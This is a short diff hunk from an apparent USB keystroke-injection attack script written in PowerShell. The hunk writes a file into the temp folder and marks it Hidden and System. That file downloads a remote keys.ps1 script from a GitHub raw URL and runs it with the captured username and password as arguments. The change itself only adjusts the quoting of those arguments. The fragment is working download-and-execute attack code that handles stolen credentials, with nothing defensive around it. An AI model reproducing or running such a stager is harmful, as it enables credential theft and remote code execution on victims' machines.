@@ -363,7 +363,7 @@ $functions =  {
 			if(-Not ([System.IO.File]::Exists($modulenamepath)))
 			{
 				Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/keys.ps1"))' -Force $env:TEMP\$modulename
-				Out-File -InputObject "Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -ArgumentList $username, $password" -Append -NoClobber $env:TEMP\$modulename
+				Out-File -InputObject "Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -ArgumentList '$username', '$password'" -Append -NoClobber $env:TEMP\$modulename
 				$modulenamefile = Get-Item $env:TEMP\$modulename
 				$modulenamefile.Attributes="Hidden","System"
 			}
